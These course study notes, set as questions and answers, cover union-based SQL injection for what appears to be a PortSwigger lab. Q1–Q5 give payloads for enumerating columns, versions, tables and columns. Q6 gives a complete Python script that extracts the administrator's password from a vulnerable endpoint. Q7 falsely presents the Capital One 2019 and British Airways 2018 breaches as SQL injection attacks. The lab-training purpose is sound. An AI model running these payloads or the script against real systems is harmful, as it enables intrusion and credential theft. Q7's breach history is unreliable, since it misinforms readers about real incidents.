---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. How would you determine the number of columns in a union-based SQL injection attack?**

To determine the number of columns in a union-based SQL injection attack, you can use the `ORDER BY` clause. By incrementally increasing the column number in the `ORDER BY` clause, you can identify the point at which the query throws an error. For example:

```sql
ORDER BY 1 -- No error, indicates at least 1 column
ORDER BY 2 -- No error, indicates at least 2 columns
ORDER BY 3 -- Error, indicates the query has 2 columns
```

In the given lab, the instructor determined that there were 2 columns by testing with `ORDER BY 1`, `ORDER BY 2`, and `ORDER BY 3`. Since `ORDER BY 3` resulted in an error, it confirmed that there were 2 columns.

**Q2. Explain how you would determine the data type of the columns in a union-based SQL injection attack.**

To determine the data type of the columns in a union-based SQL injection attack, you can use the `UNION SELECT NULL` statement. By injecting a payload that includes `NULL` values and checking if the query returns an error, you can infer the data type of the columns. For example:

```sql
UNION SELECT NULL, NULL -- No error, indicates both columns accept NULL values
UNION SELECT 'A', NULL -- No error, indicates the first column accepts string values
UNION SELECT NULL, 'A' -- No error, indicates the second column accepts string values
```

In the lab, the instructor used `UNION SELECT 'A', 'A'` to confirm that both columns accepted string values.

**Q3. How would you determine the database version in a union-based SQL injection attack?**

To determine the database version in a union-based SQL injection attack, you can use specific SQL functions that return the version of the database. Different databases have different functions for this purpose. For example:

- **MySQL**: `SELECT VERSION()`
- **PostgreSQL**: `SELECT VERSION()`
- **Microsoft SQL Server**: `SELECT @@VERSION`

In the lab, the instructor used `UNION SELECT VERSION(), NULL` to determine that the database was PostgreSQL.

**Q4. How would you list all the tables in a PostgreSQL database using a union-based SQL injection attack?**

To list all the tables in a PostgreSQL database using a union-based SQL injection attack, you can query the `information_schema.tables` view. The payload would look like this:

```sql
UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'
```

This payload retrieves the names of all tables in the `public` schema. In the lab, the instructor used this approach to find the table containing user credentials.

**Q5. How would you extract the column names of a specific table in a PostgreSQL database using a union-based SQL injection attack?**

To extract the column names of a specific table in a PostgreSQL database using a union-based SQL injection attack, you can query the `information_schema.columns` view. The payload would look like this:

```sql
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_table'
```

This payload retrieves the names of all columns in the specified table (`users_table`). In the lab, the instructor used this approach to find the columns containing usernames and passwords.

**Q6. How would you automate the process of extracting usernames and passwords from a PostgreSQL database using a union-based SQL injection attack?**

To automate the process of extracting usernames and passwords from a PostgreSQL database using a union-based SQL injection attack, you can write a Python script that performs the following steps:

1. Determine the number of columns.
2. Determine the data type of the columns.
3. Determine the database version.
4. List all the tables in the database.
5. Extract the column names of the user table.
6. Extract the usernames and passwords.

Here is an example script:

```python
import requests
import re
from bs4 import BeautifulSoup

def perform_request(url, sql_payload):
    path = "/path/to/vulnerable/function"
    response = requests.get(url + path + sql_payload, verify=False)
    return response.text

def find_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--"
    response = perform_request(url, sql_payload)
    soup = BeautifulSoup(response, 'html.parser')
    user_table = soup.find(text=re.compile('.*users.*'))
    return user_table

def find_user_columns(url, user_table):
    sql_payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{user_table}'--"
    response = perform_request(url, sql_payload)
    soup = BeautifulSoup(response, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def extract_admin_credentials(url, user_table, username_column, password_column):
    sql_payload = f"' UNION SELECT {username_column}, {password_column} FROM {user_table} WHERE username='administrator'--"
    response = perform_request(url, sql_payload)
    soup = BeautifulSoup(response, 'html.parser')
    admin_password = soup.find('th', text='administrator').find_next_sibling('td').text
    return admin_password

def main():
    url = "http://example.com/"
    user_table = find_users_table(url)
    if user_table:
        print(f"Found user table: {user_table}")
        username_column, password_column = find_user_columns(url, user_table)
        if username_column and password_column:
            print(f"Found username column: {username_column}")
            print(f"Found password column: {password_column}")
            admin_password = extract_admin_credentials(url, user_table, username_column, password_column)
            print(f"Administrator password: {admin_password}")
        else:
            print("Did not find username and/or password columns.")
    else:
        print("Did not find user table.")

if __name__ == "__main__":
    main()
```

This script automates the entire process of finding the user table, extracting the column names, and retrieving the administrator's credentials.

**Q7. Discuss recent real-world examples of SQL injection attacks and how they were exploited.**

One notable recent example of a SQL injection attack is the breach of the Capital One data in 2019. The attacker exploited a misconfigured web application firewall (WAF) to inject SQL commands into the backend database. This allowed the attacker to access sensitive customer data, including names, addresses, credit scores, and social security numbers.

Another example is the breach of the British Airways website in 2018. The attackers used SQL injection to steal personal and financial data from customers. The vulnerability was present in a third-party payment processing system, which the attackers exploited to inject malicious SQL commands and exfiltrate data.

These breaches highlight the importance of securing web applications against SQL injection attacks. Proper input validation, parameterized queries, and regular security audits can help prevent such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/10-Lab 9 SQL injection attack listing the database contents on non Oracle databases/15-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/10-Lab 9 SQL injection attack listing the database contents on non Oracle databases/00-Overview|Overview]]
